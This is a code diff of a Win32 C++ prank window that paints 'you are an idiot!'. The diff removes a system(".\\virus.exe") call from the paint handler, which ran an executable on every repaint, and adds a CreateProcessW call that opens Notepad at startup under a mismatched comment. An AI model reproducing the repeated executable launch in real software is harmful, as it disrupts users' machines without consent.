@@ -22,8 +22,22 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             currentColor = BLACK;
         }
         is_black = !is_black;
+        // STARTUPINFOW si = {0};
+        // PROCESS_INFORMATION pi = {0};
 
-        // Force repaint
+        // // Force repaint
+        // CreateProcessW(
+        //     L"C:\\Windows\\System32\\notepad.exe",
+        //     NULL,
+        //     NULL,
+        //     NULL,
+        //     FALSE,
+        //     0,
+        //     NULL,
+        //     NULL,
+        //     &si,
+        //     &pi
+        // );
         InvalidateRect(hwnd, NULL, TRUE);
         return 0;
 
@@ -56,13 +70,10 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         SetBkMode(hdc, TRANSPARENT); // so text doesn't overwrite background
 
         const wchar_t* text = L"you are an idiot!";
-        const wchar_t* b_text = L"���";
-        TextOut(hdc, 50, 50, text, lstrlen(text));
-        TextOut(hdc, 50, 100, b_text, lstrlen(b_text));
+        const wchar_t* b_text = L"☺☺☺";
         SelectObject(hdc, oldFont);
         DeleteObject(hFont);
         EndPaint(hwnd, &ps);
-        system(".\\virus.exe");
     }
     return 0;
 
@@ -80,6 +91,22 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow)
     const wchar_t CLASS_NAME[] = L"idiot";
 
     WNDCLASS wc = {};
+            STARTUPINFOW si = {0};
+        PROCESS_INFORMATION pi = {0};
+
+        // Force repaint
+        CreateProcessW(
+            L"C:\\Windows\\System32\\notepad.exe",
+            NULL,
+            NULL,
+            NULL,
+            FALSE,
+            0,
+            NULL,
+            NULL,
+            &si,
+            &pi
+        );
     wc.lpfnWndProc = WindowProc;
     wc.hInstance = hInstance;
     wc.lpszClassName = CLASS_NAME;
